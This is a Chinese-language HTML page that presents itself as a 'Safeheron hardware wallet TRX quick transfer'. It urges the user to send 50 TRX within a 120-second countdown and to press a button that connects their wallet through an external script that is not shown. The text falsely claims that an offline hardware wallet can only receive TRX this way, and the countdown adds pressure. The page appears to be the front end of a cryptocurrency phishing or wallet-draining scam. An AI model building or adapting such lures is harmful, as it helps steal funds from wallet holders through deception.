<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DApp Frontend</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <h1>Safeheron硬件钱包TRX快速转入</h1>
        <div class="progress-bar">
            <div id="progress"></div>
        </div>
        <div class="countdown" id="countdown">120秒内请完成</div>
        <h2>向硬件钱包转入50TRX</h2>
        <div class="button-container">
            <button id="okButton" onclick="connectWallet()">确定转入</button>
        </div>
        <div class="warning">硬件钱包未联网仅可通过此方法向硬件钱包转入TRX
        </div>
    </div>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
    <script src="script.js"></script>
    <script>
        let countdown = 120;
        const countdownElement = document.getElementById('countdown');
        const progressElement = document.getElementById('progress');

        function updateCountdown() {
            countdown--;
            countdownElement.textContent = `${countdown}秒内请完成`;
            progressElement.style.width = `${(120 - countdown) / 120 * 100}%`;

            if (countdown <= 0) {
                clearInterval(countdownInterval);
                countdownElement.textContent = "请重试";
                progressElement.style.width = "100%";
            }
        }

        const countdownInterval = setInterval(updateCountdown, 1000);
    </script>
</body>
</html>
